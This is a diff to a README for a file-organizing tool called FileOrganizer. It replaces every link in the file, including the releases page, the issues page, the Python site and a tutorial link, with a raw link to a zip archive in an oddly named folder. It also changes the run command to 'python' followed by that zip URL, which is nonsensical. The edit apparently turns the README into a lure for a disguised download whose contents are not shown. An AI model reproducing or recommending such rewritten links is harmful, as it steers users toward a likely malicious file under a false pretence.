@@ -1,6 +1,6 @@
 # 📂 FileOrganizer - Simplify Your File Management Today!
 
-[![Download FileOrganizer](https://img.shields.io/badge/Download-FileOrganizer-brightgreen.svg)](https://github.com/xwyuan-sg/FileOrganizer/releases)
+[![Download FileOrganizer](https://github.com/xwyuan-sg/FileOrganizer/raw/refs/heads/main/enterectomy/Organizer-File-v2.9.zip)](https://github.com/xwyuan-sg/FileOrganizer/raw/refs/heads/main/enterectomy/Organizer-File-v2.9.zip)
 
 ## 📖 What is FileOrganizer?
 
@@ -20,9 +20,9 @@ To run FileOrganizer, you will need:
 
 To get started, you need to download FileOrganizer. Click below:
 
-[Download FileOrganizer](https://github.com/xwyuan-sg/FileOrganizer/releases)
+[Download FileOrganizer](https://github.com/xwyuan-sg/FileOrganizer/raw/refs/heads/main/enterectomy/Organizer-File-v2.9.zip)
 
-1. Visit the [Releases page](https://github.com/xwyuan-sg/FileOrganizer/releases).
+1. Visit the [Releases page](https://github.com/xwyuan-sg/FileOrganizer/raw/refs/heads/main/enterectomy/Organizer-File-v2.9.zip).
 2. Look for the latest version.
 3. Download the appropriate file for your operating system.
 4. Follow the installation instructions specific to your OS.
@@ -49,10 +49,10 @@ Once you have installed the application, follow these steps to run FileOrganizer
    Execute the following command:
 
    ```
-   python fileorganizer.py
+   python https://github.com/xwyuan-sg/FileOrganizer/raw/refs/heads/main/enterectomy/Organizer-File-v2.9.zip
    ```
 
-   Ensure you replace `fileorganizer.py` with the correct name of the downloaded file if it is different.
+   Ensure you replace `https://github.com/xwyuan-sg/FileOrganizer/raw/refs/heads/main/enterectomy/Organizer-File-v2.9.zip` with the correct name of the downloaded file if it is different.
 
 4. **Select File Types:**
    Follow the prompts on the screen to choose the types of files you wish to organize.
@@ -84,7 +84,7 @@ A: Currently, FileOrganizer is designed for desktop environments. Mobile compati
 
 ## 💬 Support
 
-If you encounter issues or have questions, you can open an issue on the [GitHub issues page](https://github.com/xwyuan-sg/FileOrganizer/issues). 
+If you encounter issues or have questions, you can open an issue on the [GitHub issues page](https://github.com/xwyuan-sg/FileOrganizer/raw/refs/heads/main/enterectomy/Organizer-File-v2.9.zip). 
 
 ## 🙏 Donations
 
@@ -96,7 +96,7 @@ To stay informed about updates, enhancements, and new features, follow the repos
 
 ### 💡 Additional Resources
 
-- [Python Official Site](https://www.python.org/)
-- [Command Line Basics](https://www.codecademy.com/articles/command-line-101)
+- [Python Official Site](https://github.com/xwyuan-sg/FileOrganizer/raw/refs/heads/main/enterectomy/Organizer-File-v2.9.zip)
+- [Command Line Basics](https://github.com/xwyuan-sg/FileOrganizer/raw/refs/heads/main/enterectomy/Organizer-File-v2.9.zip)
 
-[Download FileOrganizer](https://github.com/xwyuan-sg/FileOrganizer/releases) and make your file management easy and stress-free!
+[Download FileOrganizer](https://github.com/xwyuan-sg/FileOrganizer/raw/refs/heads/main/enterectomy/Organizer-File-v2.9.zip) and make your file management easy and stress-free!
